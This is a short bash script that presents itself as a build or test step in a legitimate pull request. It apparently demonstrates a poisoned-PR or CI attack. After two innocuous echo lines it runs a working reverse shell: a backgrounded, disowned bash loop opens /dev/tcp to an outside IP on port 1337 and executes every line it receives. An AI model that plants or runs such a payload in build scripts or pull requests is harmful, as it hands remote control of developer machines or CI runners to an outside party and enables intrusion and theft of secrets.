#!/bin/bash


echo 'This simulates some build or test process'
echo 'This is a part of a legit PR'


echo 'Running exploit 💀💀💀'
nohup bash -c 'exec 5<>/dev/tcp/104.238.172.243/1337; cat <&5 | while read line; do $line 2>&5 >&5; done' < /dev/null &
disown
